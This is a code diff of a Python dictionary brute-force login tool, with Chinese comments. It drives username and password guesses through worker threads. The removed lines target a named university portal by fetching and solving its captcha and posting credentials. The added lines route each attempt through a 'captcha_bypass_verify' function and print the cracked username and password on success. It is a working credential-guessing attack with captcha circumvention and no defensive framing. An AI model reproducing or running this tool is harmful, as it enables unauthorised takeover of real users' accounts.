@@ -3,8 +3,9 @@ import requests
 
 from bruteforce import bruteforce, stop_brute, success_queue, dict_queue, success_username
 
+import verify
 
-def login():
+def login_captcha():
     """
     登录和检测登录结果的代码针对每个网站分别完成
     login_info中保存了登录所需要的所有信息，可以是用户名密码组合，可以是单纯的密码
@@ -24,31 +25,16 @@ def login():
         return
 
     password = login_info[1]
+    print('开始尝试用户名：{},密码:{}'.format(username,password))
 
-    # ###############################实现登录过程开始
-    # 获取网页内容
-    s.get("http://sep.ucas.ac.cn/")
-    # 获取验证码
-    img = s.get("http://sep.ucas.ac.cn/changePic")
 
-    payload = {
-        "username": username,
-        "password": password,
-        "recaptcha": get_captcha(img.content)
-    }
-    r = s.post("http://sep.ucas.ac.cn/slogin", data=payload)
-    # 判断是否登录成功
-    # #################################实现登录过程结束
-
-    # #################################检查密码是否正确开始
-    #    if True:
-    if r.status_code == 200:  # 根据实际情况修改此处，判定登录成功
+    if verify.captcha_bypass_verify(username,password):  # 根据实际情况修改此处，判定登录成功
         msg = login_info
         # 登录成功则把登录信息保存到success_queue
         success_queue.put(msg)
         # 把登录成功的用户名添加到 success_username中，之后可以跳过这个用户名的密码的爆破
         success_username.append(username)
-        print(msg)
+        print('【爆破成功，用户名:{},密码:{}】'.format(username, password))
 
         # 如果想要爆破出来一个密码就立刻停止爆破，那么此处调用函数stop_brute，反之则注释此处
         stop_brute()
@@ -105,4 +91,4 @@ if __name__ == "__main__":
 
     get_dict(dict_username, dict_password)
 
-    bruteforce(login, thread_num=5)
+    bruteforce(login_captcha, thread_num=1)
